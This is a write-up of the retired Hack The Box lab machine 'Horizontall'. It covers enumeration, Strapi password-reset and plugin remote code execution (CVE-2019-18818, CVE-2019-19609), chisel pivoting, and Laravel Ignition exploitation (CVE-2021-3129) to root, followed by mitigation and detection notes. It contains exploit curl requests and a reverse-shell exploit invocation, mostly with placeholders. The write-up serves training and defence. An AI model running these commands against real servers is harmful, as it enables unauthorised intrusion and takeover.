---
machine: Horizontall
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, strapi, laravel, cve-2019-19609, cve-2021-3129, pivoting]
---

# Horizontall — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

`api-prod.horizontall.htb` runs Strapi 3.0.0-beta.17.4. CVE-2019-18818 resets the admin password and CVE-2019-19609 executes commands. The `strapi` shell reveals Laravel on `127.0.0.1:8000`; tunnel it and exploit CVE-2021-3129 (Ignition) for root.

## Enumeration

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sC -sV -p22,80 <IP>
```

`horizontall.htb` is a landing page. Enumerate vhosts:

```bash
ffuf -u http://horizontall.htb -H 'Host: FUZZ.horizontall.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

`api-prod.horizontall.htb` appears, with Strapi at `/admin`.

## Initial access

Get the version from `/admin/init` or the bundle. Strapi 3.0.0-beta.17.4 is vulnerable to CVE-2019-18818:

```bash
curl -s -X POST http://api-prod.horizontall.htb/admin/auth/reset-password \
  -H 'Content-Type: application/json' \
  -d '{"code":"<RESET_CODE>","password":"<NEW_PASSWORD>","passwordConfirmation":"<NEW_PASSWORD>"}'
```

Log in at `/admin` and obtain the JWT. Exploit CVE-2019-19609 in the plugin endpoint:

```bash
curl -s -X POST http://api-prod.horizontall.htb/admin/plugins/install \
  -H "Authorization: Bearer <JWT>" \
  -H 'Content-Type: application/json' \
  -d '{"plugin":"<PLUGIN>","port":<PORT>}'
```

The payload spawns a reverse shell as `strapi`.

## Lateral movement

```bash
ss -tlnp
# 127.0.0.1:8000
```

Port 8000 only listens locally. Tunnel it with chisel or SSH local forwarding:

```bash
chisel client <LHOST>:<LPORT> 8000:127.0.0.1:8000
```

Identify Laravel with debug enabled. The error page leaks the version and project path.

## Privilege escalation

Laravel 8 with Ignition is vulnerable to CVE-2021-3129. Send a payload that writes a PHAR and deserialises it for command execution:

```bash
python3 exploit.py http://127.0.0.1:8000 <LHOST> <LPORT>
```

The resulting shell is root. Read and redact the flag.

## Evidence

- `admin/init` response and Strapi version.
- Password reset and redacted JWT.
- `ss -tlnp` showing port 8000.
- Ignition request and `id` as root.

## Lessons learned

- Old Strapi accumulates authentication and RCE flaws.
- An internal service may be the real escalation path.
- Laravel debug mode exposes Ignition and absolute paths.
- Chisel pivoting avoids exposing the internal port.

## Mitigation and detection

- Update Strapi and Laravel; disable `APP_DEBUG` in production.
- Restrict `/admin` and plugin endpoints.
- Do not expose development services on the host.
- Detect mass password resets and requests to `_ignition/execute-solution`.

## References

- <https://nvd.nist.gov/vuln/detail/CVE-2019-19609>
- <https://nvd.nist.gov/vuln/detail/CVE-2021-3129>
- <https://www.hackthebox.com/machines/horizontall>
